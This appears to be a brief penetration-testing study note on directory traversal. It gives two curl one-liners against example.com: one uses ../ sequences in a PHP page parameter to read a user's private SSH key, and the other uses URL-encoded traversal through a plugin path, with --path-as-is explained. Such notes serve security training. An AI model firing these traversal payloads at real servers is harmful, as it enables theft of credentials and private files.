Basic directory traversal to grab SSH key from PHP traversal using curl in terminal: 
 - ``` curl http://example.com/anotherpage/index.php?page=../../../../../../../../../home/kali/.ssh/id_rsa ```
 - in some cases it may be useful to prepend --path-as-is in the curl command for traversal

URL encoding directory traversal:
 - ``` curl --path-as-is http://example.com:3000/public/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/Users/install.txt ```
 - In the above code block, %2f is the URL encoded version of a forward slash "/" and each %2e represents a dot "."
